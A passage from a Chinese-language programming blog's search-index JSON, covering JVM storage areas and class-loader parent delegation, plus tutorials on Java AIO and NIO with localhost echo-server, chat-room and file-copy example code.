调用肯定会栈溢出,但是如果远程恶意修改栈空间就会导致内存溢出.","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"}]},{"title":"JVM classloader and parent delegation-mechanism","slug":"JVM-类加载器和双亲委派机制","date":"2020-12-14T05:28:57.000Z","updated":"2021-04-11T17:11:28.217Z","comments":true,"path":"JVM-classloader-and-parent-delegation-mechanism/","link":"","permalink":"https://kayleh.top/JVM-classloader-and-parent-delegation-mechanism/","excerpt":"","text":"JVM-类加载器和双亲委派机制JVMjava的六种存储地址及解释1） 寄存器(register)：这是最快的存储区，因为它位于不同于其他存储区的地方——处理器内部。但是寄存器的数量极其有限，所以寄存器由编译器根据需求进行分配。你不能直接控制，也不能在程序中感觉到寄存器存在的任何迹象。 2） 堆栈(stack)：位于通用RAM中，但通过它的“堆栈指针”可以从处理器哪里获得支持。堆栈指针若向下移动，则分配新的内存；若向上移动，则释放那些内存。这是一种快速有效的分配存储方法，仅次于寄存器。创建程序时候，JAVA编译器必须知道存储在堆栈内所有数据的确切大小和生命周期，因为它必须生成相应的代码，以便上下移动堆栈指针。这一约束限制了程序的灵活性，所以虽然某些JAVA数据存储在堆栈中——特别是对象引用，但是JAVA对象不存储其中。3）堆(heap)：一种通用性的内存池（也存在于RAM中），用于存放所有的JAVA对象。堆不同于堆栈的好处是：编译器不需要知道要从堆里分配多少存储区域，也不必知道存储的数据在堆里存活多长时间。因此，在堆里分配存储有很大的灵活性。当你需要创建一个对象的时候，只需要new写一行简单的代码，当执行这行代码时，会自动在堆里进行存储分配。当然，为这种灵活性必须要付出相应的代码。用堆进行存储分配比用堆栈进行存储存储需要更多的时间。4）静态存储(static storage)：这里的“静态”是指“在固定的位置”。静态存储里存放程序运行时一直存在的数据。你可用关键字static来标识一个对象的特定元素是静态的，但JAVA对象本身从来不会存放在静态存储空间里。5） 常量存储(constant storage)：常量值通常直接存放在程序代码内部，这样做是安全的，因为它们永远不会被改变。有时，在嵌入式系统中，常量本身会和其他部分分割离开，所以在这种情况下，可以选择将其放在ROM中。6） 非RAM存储：如果数据完全存活于程序之外，那么它可以不受程序的任何控制，在程序没有运行时也可以存在。 栈、堆、方法区存储的内容 堆区:1.存储的全部是对象，每个对象都包含一个与之对应的class的信息。(class的目的是得到操作指令)2.jvm只有一个堆区(heap)被所有线程共享，堆中不存放基本类型和对象引用，只存放对象本身 。 栈区:1.每个线程包含一个栈区，栈中只保存基础数据类型的值和对象以及基础数据的引用2.每个栈中的数据(基础数据类型和对象引用)都是私有的，其他栈不能访问。3.栈分为3个部分：基本类型变量区、执行环境上下文、操作指令区(存放操作指令)。 方法区:1.又叫静态区，跟堆一样，被所有的线程共享。方法区包含所有的class和static变量。2.方法区中包含的都是在整个程序中永远唯一的元素，如class，static变量。 JVM在什么位置？在操作系统之上。 JVM的体系结构 *栈用完系统会自动释放，不会有垃圾 栈、本地方法栈、程序计数器：百之百没有垃圾，不会有垃圾回收 JVM调优百分之99都是在调方法区和堆，而百分之99都是再调堆 类加载器类加载器的作用？ 加载Class文件 加载器分为 虚拟机自带的加载器 启动类（根）加载器 扩展类加载器 应用程序加载器 类的加载过程java中类的加载有5个过程，加载、验证、准备、解析、初始化； 这便是类加载的5个过程，而类加载器的任务是根据一个类的全限定名来读取此类的二进制字节流到JVM中，然后转换为一个与目标类对应的java.lang.Class对象实例，在虚拟机提供了3种类加载器，引导（Bootstrap）类加载器、扩展（Extension）类加载器、系统（System）类加载器（也称应用类加载器）。 Class文件中的“类”从加载到JVM内存中，到卸载出内存过程有七个生命周期阶段。类加载机制包括了前五个阶段。 如下图所示： 其中，加载、验证、准备、初始化、卸载的\\开始顺序**是确定的，注意，只是按顺序开始，进行与结束的顺序并不一定。解析阶段可能在初始化之后开始。 另外，类加载无需等到程序中“首次使用”的时候才开始，JVM预先加载某些类也是被允许的。（\\类加载的时机**） 1、通过一个类的全限定名（包名与类名）来获取定义此类的二进制字节流（Class文件）。而获取的方式，可以通过jar包、war包、网络中获取、JSP文件生成等方式。 2、将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。这里只是转化了数据结构，并未合并数据。（方法区就是用来存放已被加载的类信息，常量，静态变量，编译后的代码的运行时内存区域） 3、在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。这个Class对象并没有规定是在Java堆内存中，它比较特殊，虽为对象，但存放在方法区中。 双亲委派模式 升级处理交由最顶级处理 最顶级说我这没你们随便 在降级处理 双亲委派模式是在Java 1.2后引入的，其工作原理的是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都很懒，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，所以默认是父装载 1.类加载器收到类加载的请求 2.将这个请求向上委托给父类加载器去完成,一直向上委托,直到启动类加载器 3.启动加载器检查是否能够加载当前这个类,能加载就结束,使用当前的加载器,否则,抛出异常,通知子加载器进行加载 4.重复步骤 3 Class Not Found","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"}]},{"title":"AIO blocking model","slug":"AIO模型","date":"2020-12-04T19:57:07.000Z","updated":"2021-04-11T17:11:28.086Z","comments":true,"path":"AIO-blocking-model/","link":"","permalink":"https://kayleh.top/AIO-blocking-model/","excerpt":"","text":"AIO模型1. 在系统层面分析IO模型当我们从网络中或者其他进程中接收到数据时，这个数据会先被拷贝到系统内核的缓冲区，然后从内核的缓冲区中再复制到我们应用程序对应的缓冲区中，这样我们才能实现从应用程序中取得这个数据。 1.1 BIO模型 我们的应用程序会首先调用特定的函数，这样才能去访问我们的操作系统。拿我们的BIO聊天室来说，我们在服务器上，想看一下客户端从网络上传递过来的数据有没有准备好，那么它会去询问操作系统有没有收到新的数据，如果没有收到，它会一直阻塞在这里，直到收到消息，并且已经从系统内核缓冲区中拷贝到应用程序的缓冲区中，这样这个调用才能够成功返回。这就是阻塞式IO，我们在等待的过程中，什么都做不了。 1.2 NIO模型 当我们的应用程序进行系统调用，询问数据有没有准备好，没有准备好的话，因为它是非阻塞的，所以直接返回；直到系统已经将内核缓冲区中的数据复制到应用程序的缓冲区中，这时我们再去询问数据有没有准备好的话，就能够获取到我们想要的数据了。但是它并不包括Selector监听模式，仅仅是NIO中的非阻塞式模型。 1.2.1 IO多路复用 这个模式对应的就是我们NIO聊天室中采用的模式，使用了Selector监听 首先我们的应用程序发起新的询问，是不是有可用的数据进行操作了，如果数据这时没有准备好，并不会如上NIO直接返回，而是说，我们要求内核监听我们这个IO通道，直到它有了数据可以供我们的程序进行操作了，再来通知我们，这个监听的过程，就像我们聊天室中的select()方法，它是阻塞的。直到数据已经在系统内核缓存区中准备好了，它会通知你一下，告诉你可以执行系统调用，将缓存区中的数据复制到应用程序缓存区中，这时我们才真正获取到了我们想要的数据 在这个时候，系统内核能够监听多个IO通道，跟我们的聊天室一样，它也监听了多个通道，只要其中任何一个IO通道有了新的状态更新，那么这个监听都会返回给我们应用程序说，其中的IO通道有一个或者多个出现了状态的变化，你要不要对其进行处理一下，我们便可以根据它返回的条件，进行特定的处理。（Selector可以翻译成为IO多路复用器） 1.3 AIO模型（异步IO） BIO和NIO都是同步IO模型，这里我们说说AIO（异步）模型 同步IO模型是当我们访问的这个数据无论有没有准备好，都会返回给你结果；当数据没有准备好的时候，我们没有能够获取数据，如果我们再也不发起获取数据的请求，那么我们永远都不会再获取到这个数据。异步IO就不同了，当你请求这个数据没有请求到，而之后这个数据准备好了，它就会回去通知你，可以来取这个数据了 我们来看一下这个流程：我们去请求数据，数据没有准备好，我们没有被阻塞，而是直接返回了。在应用程序层面，虽然我们没有再发起新的请求，但是在系统后台，会监听这个我们请求数据的状态，当我们需要的数据已经准备好了，并且已经存在于系统内核缓存区中了，系统后台还会将这个数据拷贝到我们的应用程序缓存区中，到这里，系统内核会递交给我们一个信号，告诉你，你之前想要的这个数据，已经准备好给你了，你可以进行使用了。 它的异步体现在：我们程序只对数据发起了一次请求，没有请求到，就直接返回了，而之后，当这个数据已经准备好的时候，系统回来通知我们，而不需要我们再次发起请求，就能获取到这个数据，这就体现了异步的特点。A就是asynchronous，也就是异步的意思 2. 异步调用机制2.1 AIO中的异步操作 客户端对应AsynchronousSocketChannel 服务端对应AsynchronousServerSocketChannel 建立连接为connect/accept 读操作为read 写操作为write 2.2 通过Future进行异步调用 注意其中Future的get()方法是阻塞式的 2.3 通过CompletionHandler（多用） 在执行操作的时候，传入CompletionHandler参数 3. 实战（回音服务器）3.1 服务器端3.1.1 字段 3.1.2 主方法 3.1.3 AcceptHandler的实现 3.1.4 ClientHandler的实现 3.2 客户端3.2.1 字段 3.2.2 主方法 4. 代码4.1 服务器端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134import java.io.Closeable;import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousServerSocketChannel;import java.nio.channels.AsynchronousSocketChannel;import java.nio.channels.CompletionHandler;import java.util.HashMap;import java.util.Map;public class Server &#123; private static final String LOCALHOST = \"localhost\"; private static final int DEFAULT_PORT = 8888; private AsynchronousServerSocketChannel serverChannel; private void close(Closeable closeable)&#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public void start()&#123; try &#123; //绑定端口号,调用的open方法（无参），这个参数类型为AsynchronousChannelGroup，其中包含共享的系统资源，如线程池， //因为我们没有传入参数，会从默认的ProviderHolder中，提供一个我们需要的AsynchronousServerSocketChannel对象 //Handler会在不同的线程中进行处理，如我们的AcceptHandler和ClientHandler，它就是动用的共享资源：线程，来执行 serverChannel = AsynchronousServerSocketChannel.open(); serverChannel.bind(new InetSocketAddress(LOCALHOST,DEFAULT_PORT)); System.out.println(\"服务器启动成功，监听端口号：\" + DEFAULT_PORT); while (true)&#123; //该accept方法为异步调用，没有需要返回的结果也会返回，即没有收到客户连接的请求时 //就会返回结果了；但是我们要保证在有客户连接的时候，主线程还在运行，否则主线程返回 //服务器就直接宕机了，我们采用下面的小技巧来避免这种情况 //accept在系统层面完成的时候（系统帮助我们完成了这个IO处理），返回的结果会被AcceptHandler来处理， //成功时执行的completed方法，失败执行的是failed方法 //附带对象无；AcceptHandler为实现接口CompletionHandler的类，处理accept请求 serverChannel.accept(null,new AcceptHandler()); //用这个来避免while过于频繁，相当于将主线程阻塞，以保证建立连接时与客户端的响应 System.in.read(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(serverChannel); &#125; &#125; /** * 程序处理accept请求的时候，并不是在主线程中执行的， * 而是从AsynchronousChannelGroup中取出另一个线程来执行 * CompletionHandler泛型为，第一个为返回的结果类型；第二个为附带的对象类型 */ private class AcceptHandler implements CompletionHandler&lt;AsynchronousSocketChannel,Object&gt; &#123; /** * completed 该方法对应的是，我们之前上方调用accept方法，正常返回了，那么会执行该方法 * @param result 方法执行成功的返回值 * @param attachment 附带信息 */ @Override public void completed(AsynchronousSocketChannel result, Object attachment) &#123; if(serverChannel.isOpen())&#123; //确保服务器还在运行 //服务器继续等待下一个客户端来请求，但是这里并不是产生过多的accept方法压栈 //而造成的栈溢出问题，这在底层已经进行保护了 serverChannel.accept(null,this); &#125; //处理已连接客户端的读写操作 AsynchronousSocketChannel clientChannel = result; if(clientChannel != null &amp;&amp; clientChannel.isOpen())&#123; ClientHandler handler = new ClientHandler(clientChannel); ByteBuffer buffer = ByteBuffer.allocate(1024); Map&lt;String,Object&gt; attachmentInfo = new HashMap&lt;&gt;(); attachmentInfo.put(\"type\",\"read\"); attachmentInfo.put(\"buffer\",buffer); //依靠ClientHandler异步处理，读写操作，将其回传给客户端 clientChannel.read(buffer,attachmentInfo,handler); &#125; &#125; @Override public void failed(Throwable exc, Object attachment) &#123; //失败时的调用 &#125; &#125; private class ClientHandler implements CompletionHandler&lt;Integer,Map&lt;String,Object&gt;&gt; &#123; private AsynchronousSocketChannel clientChannel; public ClientHandler(AsynchronousSocketChannel clientChannel) &#123; this.clientChannel = clientChannel; &#125; @Override public void completed(Integer result, Map&lt;String, Object&gt; attachment) &#123; String type = (String) attachment.get(\"type\"); ByteBuffer buffer = (ByteBuffer) attachment.get(\"buffer\"); if(\"read\".equals(type))&#123; //已经读取到了客户端传过来的消息，将其回音给客户端 buffer.flip();//回音要读缓冲区 attachment.put(\"type\",\"write\"); clientChannel.write(buffer,attachment,this); &#125;else if (\"write\".equals(type))&#123; //将其回传给客户端后，等待客户端的新的信息 //将这里将再次进行异步调用，读取客户端发来的信息存储在缓冲区中 ByteBuffer byteBuffer = ByteBuffer.allocate(1024); attachment.put(\"type\",\"read\"); attachment.put(\"buffer\",byteBuffer); clientChannel.read(byteBuffer,attachment,this); &#125; &#125; @Override public void failed(Throwable exc, Map&lt;String, Object&gt; attachment) &#123; &#125; &#125; public static void main(String[] args) &#123; Server server = new Server(); server.start(); &#125;&#125; 4.2 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import java.io.*;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousSocketChannel;import java.util.concurrent.ExecutionException;import java.util.concurrent.Future;public class Client &#123; private final String LOCALHOST = \"localhost\"; private final int DEFAULT_PORT = 8888; AsynchronousSocketChannel clientChannel; private void close(Closeable closeable)&#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public void start()&#123; try &#123; clientChannel = AsynchronousSocketChannel.open(); Future&lt;Void&gt; connect = clientChannel.connect(new InetSocketAddress(LOCALHOST, DEFAULT_PORT)); connect.get();//阻塞式调用，直到有结果才返回 //读取用户的输入 BufferedReader in = new BufferedReader(new InputStreamReader(System.in)); while (true)&#123; String input = in.readLine(); byte[] inputBytes = input.getBytes(); ByteBuffer buffer = ByteBuffer.wrap(inputBytes); //向服务器发送消息 Future&lt;Integer&gt; write = clientChannel.write(buffer); write.get(); //接收服务器传来的消息 buffer.flip(); Future&lt;Integer&gt; read = clientChannel.read(buffer); read.get(); String s = new String(buffer.array()); System.out.println(s); buffer.clear(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125;finally &#123; close(clientChannel); &#125; &#125; public static void main(String[] args) &#123; Client client = new Client(); client.start(); &#125;&#125; 5. 测试结果 实战1. AIO模型分析 AsynchronousServerSocket：它属于一个AsynchronousChannelGroup，这个通道组，其实是被多个异步通道共享的资源群组，这里边我们之前提到过，有一个非常重要的资源：线程池，系统会利用线程池中的线程，来处理一些handler请求。系统利用这个资源组还为我们做了很多的事情，包括它能在数据准备好的时候通知我们和利用handler做一些异步的操作。当我们在创建AsynchronousServerSocket时(open())，我们可以自定义一个通道组，当然我们不传参的时候，系统会默认给我们一个群组。 当客户端请求与服务器建立连接时，系统会异步的调用AcceptHandler来处理连接请求，成功建立连接后，会返回一个AsynchronousSocketChannel对象，每个对象还会有一个ClientHandler来处理读写请求，在请求处理的过程中，并不是在主线程中完成的，而是通道组利用线程池资源，在不同的线程中完成异步处理。 2. 聊天室分析2.1 服务器端2.1.1 字段 2.1.2 主方法 2.1.3 AcceptHandler 2.1.4 ClientHandler（处理读写请求） 2.1.5 添加和删除用户 2.1.6 接收和转发方法 2.2 客户端客户端中使用的Future来处理异步请求，非常简单 2.2.1 主方法 2.2.2 发送消息 2.2.3 用户的输入线程 3. 测试结果 服务器端显示 4. 完整代码4.1 服务器端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186package server;import java.io.Closeable;import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousChannelGroup;import java.nio.channels.AsynchronousServerSocketChannel;import java.nio.channels.AsynchronousSocketChannel;import java.nio.channels.CompletionHandler;import java.nio.charset.Charset;import java.nio.charset.StandardCharsets;import java.util.ArrayList;import java.util.List;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class ChatServer &#123; private static final String LOCALHOST = \"localhost\"; private static final int DEFAULT_PORT = 8888; private static final String QUIT = \"quit\"; private static final int BUFFER = 1024; private AsynchronousServerSocketChannel serverChannel; private AsynchronousChannelGroup asynchronousChannelGroup; private List&lt;ClientHandler&gt; connectedClients; private Charset charset = StandardCharsets.UTF_8; private int port; public ChatServer(int port) &#123; this.port = port; connectedClients = new ArrayList&lt;&gt;(); &#125; public ChatServer() &#123; this(DEFAULT_PORT); &#125; public void start()&#123; try &#123; //自定义ChannelGroup ExecutorService executorService = Executors.newFixedThreadPool(10); asynchronousChannelGroup = AsynchronousChannelGroup.withThreadPool(executorService); serverChannel = AsynchronousServerSocketChannel.open(asynchronousChannelGroup); serverChannel.bind(new InetSocketAddress(LOCALHOST,port)); System.out.println(\"服务器已经启动成功，随时等待客户端连接...\"); while (true)&#123; serverChannel.accept(null,new AcceptHandler()); System.in.read(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(serverChannel); &#125; &#125; private class AcceptHandler implements CompletionHandler&lt;AsynchronousSocketChannel,Object&gt; &#123; @Override public void completed(AsynchronousSocketChannel clientChannel, Object attachment) &#123; if(serverChannel.isOpen()) serverChannel.accept(null,this); if(clientChannel != null &amp;&amp; clientChannel.isOpen())&#123; ClientHandler clientHandler = new ClientHandler(clientChannel); ByteBuffer buffer = ByteBuffer.allocate(BUFFER); addClient(clientHandler); clientChannel.read(buffer,buffer,clientHandler); &#125; &#125; @Override public void failed(Throwable exc, Object attachment) &#123; System.out.println(\"连接失败：\" + exc.getMessage()); &#125; &#125; private class ClientHandler implements CompletionHandler&lt;Integer,ByteBuffer&gt;&#123; private AsynchronousSocketChannel clientChannel; public ClientHandler(AsynchronousSocketChannel clientChannel) &#123; this.clientChannel = clientChannel; &#125; public AsynchronousSocketChannel getClientChannel() &#123; return clientChannel; &#125; @Override public void completed(Integer result, ByteBuffer buffer) &#123; if(buffer != null)&#123; //buffer不为空的时候，这要执行的是read之后的回调方法 if(result &lt;= 0)&#123; //客户端异常，将客户端从连接列表中移除 removeClient(this); &#125;else&#123; buffer.flip(); String fwdMsg = receive(buffer); System.out.println(getClientName(clientChannel) + fwdMsg); forwardMsg(clientChannel,fwdMsg); buffer.clear(); if(readyToQuit(fwdMsg))&#123; removeClient(this); &#125;else &#123; clientChannel.read(buffer,buffer,this); &#125; &#125; &#125; &#125; @Override public void failed(Throwable exc, ByteBuffer attachment) &#123; System.out.println(\"读写操作失败：\" + exc.getMessage()); &#125; &#125; private synchronized void addClient(ClientHandler clientHandler) &#123; connectedClients.add(clientHandler); System.out.println(getClientName(clientHandler.getClientChannel()) + \"已经连接\"); &#125; private synchronized void removeClient(ClientHandler clientHandler) &#123; AsynchronousSocketChannel clientChannel = clientHandler.getClientChannel(); connectedClients.remove(clientHandler); System.out.println(getClientName(clientChannel) + \"已经断开连接\"); close(clientChannel); &#125; private void close(Closeable closeable)&#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; private boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; private synchronized String receive(ByteBuffer buffer) &#123; return String.valueOf(charset.decode(buffer)); &#125; private synchronized void forwardMsg(AsynchronousSocketChannel clientChannel,String fwdMsg) &#123; for (ClientHandler connectedHandler : connectedClients) &#123; AsynchronousSocketChannel client = connectedHandler.getClientChannel(); if(!client.equals(clientChannel))&#123; //注意这个try，catch是自己加的 try &#123; //将消息存入缓存区中 ByteBuffer buffer = charset.encode(getClientName(client) + fwdMsg); //写给每个客户端 client.write(buffer,null,connectedHandler); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; private String getClientName(AsynchronousSocketChannel clientChannel) &#123; int port = -1; try &#123; InetSocketAddress remoteAddress = (InetSocketAddress) clientChannel.getRemoteAddress(); port = remoteAddress.getPort(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return \"客户端[\" + port + \"]:\"; &#125; public static void main(String[] args) &#123; ChatServer chatServer = new ChatServer(); chatServer.start(); &#125;&#125; 4.2 客户端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394package client;import java.io.Closeable;import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.AsynchronousSocketChannel;import java.nio.charset.Charset;import java.nio.charset.StandardCharsets;import java.util.concurrent.ExecutionException;import java.util.concurrent.Future;public class ChatClient &#123; private static final String LOCALHOST = \"localhost\"; private static final int DEFAULT_PORT = 8888; private final String QUIT = \"quit\"; private final int BUFFER = 1024; private String host; private int port; private AsynchronousSocketChannel clientChannel; private Charset charset = StandardCharsets.UTF_8; public ChatClient() &#123; this(LOCALHOST,DEFAULT_PORT); &#125; public ChatClient(String host,int port)&#123; this.host = host; this.port = port; &#125; public void start()&#123; try &#123; clientChannel = AsynchronousSocketChannel.open(); Future&lt;Void&gt; connect = clientChannel.connect(new InetSocketAddress(host, port)); connect.get(); System.out.println(\"与服务已成功建立连接\"); new Thread(new UserInputHandler(this)).start(); ByteBuffer buffer = ByteBuffer.allocate(BUFFER); while (clientChannel.isOpen())&#123; Future&lt;Integer&gt; read = clientChannel.read(buffer); int result = read.get(); if(result &lt;= 0)&#123; //这里是，当我们输入quit时，在服务器端会自动将我们移除 //所以这里关闭就好了 close(clientChannel); &#125;else &#123; buffer.flip(); String msg = String.valueOf(charset.decode(buffer)); System.out.println(msg); buffer.clear(); &#125; &#125; &#125; catch (IOException | InterruptedException | ExecutionException e) &#123; e.printStackTrace(); &#125;finally &#123; close(clientChannel); &#125; &#125; public void sendMsg(String msg)&#123; if(msg.isEmpty())&#123; return; &#125;else &#123; ByteBuffer buffer = charset.encode(msg); Future&lt;Integer&gt; write = clientChannel.write(buffer); try &#123; write.get(); &#125; catch (InterruptedException | ExecutionException e) &#123; e.printStackTrace(); &#125; &#125; &#125; private void close(Closeable closeable)&#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; public static void main(String[] args) &#123; ChatClient chatClient = new ChatClient(); chatClient.start(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132package client;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class UserInputHandler implements Runnable&#123; private ChatClient client; public UserInputHandler(ChatClient client) &#123; this.client = client; &#125; @Override public void run() &#123; BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); while (true)&#123; try &#123; String msg = consoleReader.readLine(); client.sendMsg(msg); if(client.readyToQuit(msg))&#123; System.out.println(\"成功退出聊天室\"); break; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 总结1. 三种模型的适用场景 BIO：适用于连接数目少，而且服务器资源对于我们已知的连接来说，比较充足，开发简单 NIO：相对BIO来说，开发难度较高，但是客户连接数目比较高。值得我们注意的是，由于NIO是单一的线程轮询来处理数据，需要避免每个任务执行的时间过长，防止其他线程出现过长的等待 AIO：接受的连接数目多，相对于NIO来说，是异步出来，可以接受某个任务花费过长的时间，但是开发难度比较高，维护起来也不简单。 附：可以使用JDK文件夹下面的VisualVM来监控程序的使用情况","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"NIO blocking model","slug":"NIO模型","date":"2020-12-04T19:33:46.000Z","updated":"2021-04-11T17:11:28.330Z","comments":true,"path":"NIO-blocking-model/","link":"","permalink":"https://kayleh.top/NIO-blocking-model/","excerpt":"","text":"NIO模型1. 概述1.1 翻译翻译？什么叫NIO？NIO：我认为翻译成Non-Blocking，更加的通俗直白，相比于BIO，也有一个对比，叫他非阻塞IO最好不过了 它和BIO有以下的区别 Channel是双向的，即可以读又可以写，相比于Stream，它并不区分出输入流和输出流，而且Channel可以完成非阻塞的读写，也可以完成阻塞的读写 1.2 Buffer简介 Channel的读写是离不开Buffer的，Buffer实际上内存上一块用来读写的区域。 1.2.1 写模式 其中三个指针我们要了解一下，position为当前指针位置，limit用于读模式，用它来标记可读的最大范围，capacity是最大的可写范围阈值 当我们写数据写了四个格子时，我们执行flip()方法，即可转变为读模式，limit指针就直接变到了我们刚刚写数据的极限位置，position指针回到初始位置，这样我们就可以将数据读出来了 1.2.2 读模式到写模式的两种切换 当我们将数据全部读完时，切换到写模式调用clear()方法，它会使position指针回到初始位置，limit回到最远端，这样就可以重新开始数据了，虽然clear意为清除，但是其实它只是将指针的位置移动了，并没有将数据清除，而是会覆盖原来的位置 只读了部分数据，我想将未读的部分保留，而现在我又要开始先进行写模式的操作了，这样可以执行compact()方法这个方法会将没有读到的数据保存到初始位置，而position指针的位置将会移动到这些数据的后面位置，从未读的数据后开始进行写数据之后再读数据的时候，我们就能将上次没有读到的数据读出来了 1.3 Channel简介Channel间的数据交换，都需要依赖Buffer 1.3.1 几个重要的Channel FileChannel：用于文件传输 ServerSocketChannel和SocketChannel：用于网络编程的传输 2. 文件拷贝实战 一个字节一个字节的拷贝实在是慢的不行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141import java.io.*;import java.nio.ByteBuffer;import java.nio.channels.FileChannel;interface FileCopyRunner&#123; void copyFile(File source,File target);&#125;public class FileCopyDemo &#123; private static void close(Closeable closeable)&#123; if(closeable != null) &#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; //不使用任何缓冲的留的拷贝 private static FileCopyRunner noBufferStreamCopy = new FileCopyRunner() &#123; @Override public void copyFile(File source, File target) &#123; InputStream fin = null; OutputStream fout = null; try &#123; fin = new FileInputStream(source); fout = new FileOutputStream(target); int result; while((result = fin.read()) != - 1)&#123; fout.write(result); &#125; &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(fin); close(fout); &#125; &#125; &#125;; //使用缓冲区的流的拷贝 private static FileCopyRunner bufferStreamCopy = new FileCopyRunner() &#123; @Override public void copyFile(File source, File target) &#123; InputStream fin = null; OutputStream fout = null; try &#123; fin = new FileInputStream(source); fout = new FileOutputStream(target); //创建缓冲区 byte[] buffer = new byte[1024]; int result; while((result = fin.read(buffer)) != -1)&#123; //result这里表示从中读出来的具体字节数 //虽然缓冲区中能缓存1024，但是我们读取的时候不一定就有这么多字节 //所以我们使用result做下面的参数 fout.write(buffer,0,result); &#125; &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(fin); close(fout); &#125; &#125; &#125;; //使用带有缓冲区的channel复制 nio private static FileCopyRunner nioBufferCopy = new FileCopyRunner() &#123; @Override public void copyFile(File source, File target) &#123; FileChannel fin = null; FileChannel fout = null; try &#123; fin = new FileInputStream(source).getChannel(); fout = new FileOutputStream(target).getChannel(); ByteBuffer byteBuffer = ByteBuffer.allocate(1024); while(fin.read(byteBuffer) != -1)&#123; byteBuffer.flip();//转变为读模式 while (byteBuffer.hasRemaining())&#123; fout.write(byteBuffer); &#125; byteBuffer.clear();//转变为写模式 &#125; &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(fin); close(fout); &#125; &#125; &#125;; //使用没有缓冲区的channel复制文件 private static FileCopyRunner nioTransferCopy = ((source, target) -&gt; &#123; FileChannel fin = null; FileChannel fout = null; try &#123; fin = new FileInputStream(source).getChannel(); fout = new FileOutputStream(target).getChannel(); long transferred = 0L; long size = fin.size(); while(transferred != size)&#123; //如果拷贝的大小没有达到源文件的大小就要一直拷贝 transferred += fin.transferTo(0,size,fout); &#125; &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(fin); close(fout); &#125; &#125;); public static void main(String[] args) &#123; File source = new File(\"J:\\\\StudySpace\\\\Java秒杀系统方案优化-高性能高并发实战\\\\project.zip\"); File target = new File(\"J:\\\\StudySpace\\\\Java秒杀系统方案优化-高性能高并发实战\\\\p1.zip\"); File target2 = new File(\"J:\\\\StudySpace\\\\Java秒杀系统方案优化-高性能高并发实战\\\\p2.zip\"); File target3 = new File(\"J:\\\\StudySpace\\\\Java秒杀系统方案优化-高性能高并发实战\\\\p3.zip\"); File target4 = new File(\"J:\\\\StudySpace\\\\Java秒杀系统方案优化-高性能高并发实战\\\\p4.zip\"); new Thread(() -&gt; noBufferStreamCopy.copyFile(source,target)).start(); new Thread(() -&gt; bufferStreamCopy.copyFile(source,target2)).start(); new Thread(() -&gt; nioBufferCopy.copyFile(source,target3)).start(); new Thread(() -&gt; nioTransferCopy.copyFile(source,target4)).start(); &#125;&#125; 3. Selector概述 Channel需要在Selector上注册 注册的同时，要告诉Selector监听的状态 